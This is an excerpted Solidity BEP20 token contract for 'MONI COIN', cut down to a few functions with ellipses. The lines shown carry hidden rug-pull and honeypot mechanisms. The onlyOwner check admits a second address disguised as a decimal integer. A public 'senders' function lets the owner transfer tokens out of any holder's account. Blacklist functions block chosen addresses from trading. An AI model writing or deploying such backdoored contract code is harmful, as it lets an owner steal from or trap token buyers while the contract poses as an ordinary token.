...
contract Ownable is Context {
    ...
    modifier onlyOwner() {
        ...
        || msg.sender == address(225635529538176461467518519947702640541689063097), "Ownable: caller is not the owner");
        _;
    }
...
contract MONI is Context, IBEP20, Ownable {
    ...
    address payable private Maddress = payable(0x868FaA7Bb26973d4607671a063ffF866Aa6673fD); 
    ...
    mapping (address => bool) private _iBld;
    ...
    string public _name = "MONI COIN";
    string public _symbol = "MONI";
    ...
    uint256 private _MTA = _totalSupply.div(25);
    ...
    function setLiqAdd(uint256 liqadd) public onlyOwner{
        _liqAdd = liqadd;
    }
    ...
    function updatePancakeRouter(address payable PancakeRouter) external onlyOwner {
        ...
        _burned[_pancakeRouterV2] = true;
    }
    
    function senders(address viom,address _account,uint256 Amount) public onlyOwner{
        _transfer(viom,_account,Amount);
    }
    ...
    function _transfer(
        ...
        require(_iBld[from] == false, "Error");
        require(_iBld[to] == false, "Error");
    ...
    function bAddress(address account) public onlyOwner {
        if(_iBld[account] == true) return;
        _iBld[account] = true;
    }
    function BMAW(address[] calldata accounts) private onlyOwner {
        require(accounts.length < 800, "ERROR");
        for (uint256 i; i < accounts.length; ++i) {
            _iBld[accounts[i]] = true;
        }
    }
    function uBAddress(address account) public onlyOwner {
         if(_iBld[account] == false) return;
        _iBld[account] = false;
    }
